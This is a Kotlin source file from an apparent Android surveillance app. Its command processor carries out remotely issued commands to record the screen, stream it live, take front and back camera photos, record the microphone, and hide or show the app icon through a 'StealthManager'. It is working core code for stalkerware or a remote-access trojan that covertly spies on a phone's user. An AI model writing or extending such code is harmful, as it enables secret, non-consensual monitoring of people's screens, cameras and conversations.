package com.guard.screen.domain.usecase

import com.guard.screen.core.AppResult
import com.guard.screen.core.Constants
import com.guard.screen.core.ErrorType
import com.guard.screen.core.Logger
import com.guard.screen.data.model.Command
import com.guard.screen.data.repository.CommandRepository
import com.guard.screen.security.StealthManager
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ProcessCommandUseCase @Inject constructor(
    private val commandRepository: CommandRepository,
    private val recordScreenUseCase: RecordScreenUseCase,
    private val capturePhotoUseCase: CapturePhotoUseCase,
    private val recordAudioUseCase: RecordAudioUseCase,
    private val streamLiveScreenUseCase: StreamLiveScreenUseCase,
    private val stealthManager: StealthManager
) {

    suspend operator fun invoke(command: Command): AppResult<Boolean> {
        Logger.d("ProcessCommand", "Processing: ${command.cmd}")

        val commandId = command.id
        if (commandId.isNullOrBlank()) {
            return AppResult.Error(ErrorType.VALIDATION, "Command ID missing")
        }

        // Mark processing
        commandRepository.updateCommandStatus(commandId, Constants.STATUS_PROCESSING)

        return try {
            val (baseCmd, param) = command.parse()
            Logger.d("ProcessCommand", "Base: $baseCmd, Param: $param")

            val result = when (baseCmd) {

                Constants.CMD_SCREEN_RECORD -> {
                    val duration = param?.toIntOrNull() ?: Constants.DEFAULT_SCREEN_DURATION
                    recordScreenUseCase(command.deviceKey, duration)
                }

                Constants.CMD_SCREEN_STOP -> AppResult.Success(true)

                Constants.CMD_LIVE_START -> streamLiveScreenUseCase(command.deviceKey)

                Constants.CMD_LIVE_STOP -> {
                    streamLiveScreenUseCase.stop()
                    AppResult.Success(true)
                }

                Constants.CMD_CAM_FRONT -> {
                    capturePhotoUseCase(command.deviceKey, useFrontCamera = true)
                }

                Constants.CMD_CAM_BACK -> {
                    capturePhotoUseCase(command.deviceKey, useFrontCamera = false)
                }

                Constants.CMD_MIC_RECORD -> {
                    val duration = param?.toIntOrNull() ?: Constants.DEFAULT_MIC_DURATION
                    recordAudioUseCase(command.deviceKey, duration)
                }

                Constants.CMD_MIC_STOP -> {
                    recordAudioUseCase.stop()
                    AppResult.Success(true)
                }

                Constants.CMD_MIC_LIVE -> {
                    AppResult.Error(ErrorType.UNKNOWN, "Live mic not implemented")
                }

                Constants.CMD_PING -> AppResult.Success(true)

                Constants.CMD_HIDE -> {
                    stealthManager.hideIcon()
                    AppResult.Success(true)
                }

                Constants.CMD_SHOW -> {
                    stealthManager.showIcon()
                    AppResult.Success(true)
                }

                else -> {
                    Logger.w("ProcessCommand", "Unknown: $baseCmd")
                    AppResult.Error(ErrorType.VALIDATION, "Unknown: $baseCmd")
                }
            }

            // ⭐ FINAL STATUS UPDATE (guaranteed)
            when (result) {
                is AppResult.Success -> {
                    commandRepository.updateCommandStatus(commandId, Constants.STATUS_DONE)
                    Logger.i("ProcessCommand", "✓ ${command.cmd} done")
                }
                is AppResult.Error -> {
                    commandRepository.updateCommandStatus(
                        commandId, Constants.STATUS_FAILED, result.message
                    )
                    Logger.e("ProcessCommand", "✗ ${command.cmd} failed: ${result.message}")
                }
                else -> {
                    commandRepository.updateCommandStatus(commandId, Constants.STATUS_DONE)
                }
            }

            when (result) {
                is AppResult.Success -> AppResult.Success(true)
                is AppResult.Error -> result
                else -> AppResult.Success(true)
            }

        } catch (e: Exception) {
            Logger.e("ProcessCommand", "Fatal", e)
            commandRepository.updateCommandStatus(
                commandId, Constants.STATUS_FAILED, e.message
            )
            AppResult.Error(ErrorType.UNKNOWN, e.message ?: "Error", e)
        }
    }
}
